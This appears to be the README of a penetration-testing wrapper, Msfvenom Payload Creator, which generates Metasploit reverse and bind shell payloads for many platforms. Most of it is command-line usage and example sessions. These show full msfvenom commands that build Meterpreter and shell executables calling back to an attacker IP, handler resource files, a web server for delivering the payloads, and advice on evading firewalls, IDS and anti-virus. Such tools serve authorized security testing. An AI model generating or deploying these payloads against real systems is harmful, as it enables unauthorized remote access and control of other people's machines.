A **quick** way to generate various "basic" Meterpreter payloads via `msfvenom` (part of the Metasploit framework).

![Msfvenom Payload Creator (MPC)](https://i.imgur.com/qxRwnYD.png)


- - -


## About

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands**, **batch payload production** and able to enter **any argument in any order** _(in various formats/patterns)_).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

* **Can't remember your IP for a interface? Don't sweat it, just use the interface name**: `eth0`.
* **Don't know what your external IP is? MPC will discover it**: `wan`.
* **Want to generate one of each payload? No issue!** Try: `loop`.
* **Want to mass create payloads? Everything? Or to filter your select? ..Either way, its not a problem**. Try: `batch` (for everything), `batch msf` (for every Meterpreter option), `batch staged` (for every staged payload), or `batch cmd stageless` (for every stageless command prompt)!

_Note: This will **NOT** try to bypass any anti-virus solutions at any stage._


## Install

+ Designed for **Kali Linux v2.x** & **Metasploit v4.11+**.
+ Kali v1.x should work.
+ OSX 10.11+ should work.
+ Weakerth4n 6+ should work.
+ _...nothing else has been tested._

```
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
```


## Help

```
root@kali:~# mpc -h -v
 [*] Msfvenom Payload Creator (MPC v1.4)

 /usr/bin/mpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
   Example: /usr/bin/mpc windows 192.168.1.10        # Windows & manual IP.
            /usr/bin/mpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
            /usr/bin/mpc stageless cmd py https      # Python, stageless command prompt.
            /usr/bin/mpc verbose loop eth1           # A payload for every type, using eth1's IP.
            /usr/bin/mpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
            /usr/bin/mpc help verbose                # Help screen, with even more information.

 <TYPE>:
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can do a interface and MPC will detect that IP address.
 Missing <DOMAIN/IP> will default to the IP menu.

 Missing <PORT> will default to 443.

 <CMD> is a standard/native command prompt/terminal to interactive with.
 <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
 Missing <CMD/MSF> will default to <MSF> where possible.
   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format.
 <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support.
 <MSF> payloads are generally much larger than <CMD>, as it comes with more features.

 <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing <BIND/REVERSE> will default to <REVERSE>.
 <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access.

 <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 Missing <STAGED/STAGELESS> will default to <STAGED> where possible.
   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format.
 <STAGED> are 'better' in low-bandwidth/high-latency environments.
 <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS.
 More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
                   https://www.offensive-security.com/metasploit-unleashed/payload-types/
                   https://www.offensive-security.com/metasploit-unleashed/payloads/

 <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.
 By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size.
 More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication

 <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT>
 <LOOP> will just create one of each <TYPE>.

 <VERBOSE> will display more information.
root@kali:~#
```


## Example \#1 (Windows, Fully Automated Using Manual IP)

```bash
root@kali:~# bash mpc.sh windows 192.168.1.10
 [*] Msfvenom Payload Creator (MPC v1.4)
 [i]   IP: 192.168.1.10
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] File (/root/windows-meterpreter-staged-reverse-tcp-443.exe) already exists. Overwriting...
 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```


## Example \#2 (Linux Format, Fully Automated Using Manual Interface and Port)

```bash
root@kali:~# ./mpc.sh elf bind eth0 4444 verbose
 [*] Msfvenom Payload Creator (MPC v1.4)
 [i]        IP: 192.168.103.183
 [i]      PORT: 4444
 [i]      TYPE: linux (linux/x86/shell/bind_tcp)
 [i]     SHELL: shell
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p linux/x86/shell/bind_tcp -f elf \
  --platform linux -a x86 -e generic/none  LPORT=4444 \
  > '/root/linux-shell-staged-bind-tcp-4444.elf'

 [i] File (/root/linux-shell-staged-bind-tcp-4444.elf) already exists. Overwriting...
 [i] linux shell created: '/root/linux-shell-staged-bind-tcp-4444.elf'

 [i] File: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
 [i] Size: 4.0K
 [i]  MD5: eed4623b765eea623f2e0206b63aad61
 [i] SHA1: 0b5dabd945ef81ec9283768054b3c22125aa9185

 [i] MSF handler file: '/root/linux-shell-staged-bind-tcp-4444-elf.rc'
 [i] Run: msfconsole -q -r '/root/linux-shell-staged-bind-tcp-4444-elf.rc'
 [?] Quick web server (for file transfer)?: python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```


## Example \#3 (Python Format, Interactive IP Menu)

```bash
root@kali:~# mpc stageless cmd py tcp
 [*] Msfvenom Payload Creator (MPC v1.4)

 [i] Use which interface - IP address?:
 [i]   1.) eth0 - 192.168.103.183
 [i]   2.) tap0 - 10.10.100.63
 [i]   3.) lo - 127.0.0.1
 [i]   4.) wan - xxx.xxx.xxx.xxx
 [?] Select 1-4, interface or IP address: 2

 [i]   IP: 10.10.100.63
 [i] PORT: 443
 [i] TYPE: python (python/shell_reverse_tcp)
 [i]  CMD: msfvenom -p python/shell_reverse_tcp -f raw \
  --platform python -e generic/none -a python LHOST=10.10.100.63 LPORT=443 \
  > '/root/python-shell-stageless-reverse-tcp-443.py'

 [i] python shell created: '/root/python-shell-stageless-reverse-tcp-443.py'

 [i] MSF handler file: '/root/python-shell-stageless-reverse-tcp-443-py.rc'
 [i] Run: msfconsole -q -r '/root/python-shell-stageless-reverse-tcp-443-py.rc'
 [?] Quick web server (for file transfer)?: python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

_Note: Removed WAN IP._


## Example \#4 (Loop - Generates one of everything)

```bash
root@kali:~# ./mpc.sh loop wan
 [*] Msfvenom Payload Creator (MPC v1.4)
 [i] Loop Mode. Creating one of each TYPE, with default values

 [*] Msfvenom Payload Creator (MPC v1.4)
 [i]   IP: xxx.xxx.xxx.xxx
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f asp \
  --platform windows -a x86 -e generic/none LHOST=xxx.xxx.xxx.xxx LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.asp'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.asp'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-asp.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-asp.rc'
 [?] Quick web server (for file transfer)?: python -m SimpleHTTPServer 8080
 [*] Done!


 [*] Msfvenom Payload Creator (MPC v1.4)
...SNIP...
 [*] Done!

root@kali ~$
```

_Note: Removed WAN IP._


![Examples](https://i.imgur.com/lQFiqil.png)


- - -


## To-Do List

* Shellcode generation
* x64 payloads
* IPv6 support
* Look into using OS scripting more _(`powershell_bind_tcp` & `bind_perl` etc)_
